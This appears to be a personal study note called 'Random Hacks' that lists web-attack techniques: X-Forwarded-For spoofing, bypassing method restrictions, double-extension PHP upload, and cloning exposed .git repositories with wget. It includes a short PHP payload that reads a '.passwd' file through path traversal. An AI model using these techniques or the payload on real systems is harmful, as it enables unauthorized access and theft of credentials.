---
tags: [misc]
---
# Random Hacks
PHPBB
* Look through the file structure and try and access through the URL
* https://www.phpbb.com/community/viewtopic.php?t=2166305

IP-Spoofing
Intranets
* Assigned ranges include:
     10.0.0.0        -   10.255.255.255  (10/8 prefix)
     172.16.0.0      -   172.31.255.255  (172.16/12 prefix)
     192.168.0.0     -   192.168.255.255 (192.168/16 prefix)
* Use X-Forwarded-For Header

WWW-Authenticate Realm
* Submission of username and password
   	* Just passed in as a base64 encode of user:password
* Some methods will be blocked, others not
   	* Maybe they disallow non-admins from GET and POST... but what about PUT? DELETE?

OS Injection through PHP File
* If you are able to upload a PHP file in the place of a img or something
   	* Try a double extension to trick it into accepting
   	* Create a PHP file that accesses sensitive data
<html>
<body>
<h1>My first PHP page</h1>
<?php
$myfile = fopen("../../../.passwd", "r") or die("Unable to open file!");
echo fread($myfile,filesize("../../../.passwd"));
fclose($myfile);
?>
</body>
</html>

Exposes Git Repo
* sometimes the git history of a page is accessible by the public :(
* add a /.git at the end of a URL to see if it's available
* traverse through to see if there is anything sensitive an attacker can exploit
* use wget -r “url" to clone the repo to your desktop
   	* Try doing it in WSL
* Then you can view the history of the repository.

---
**Related:** [[docs/moc/00-Home]] · [[docs/moc/06-Knowledge-Base-MOC]] · [[docs/brain/AMOS_Simulation_Kernel_v0_Math_Foundations]] · [[docs/brain/system_scan_agent]] · [[docs/brain/automation_profiles]]
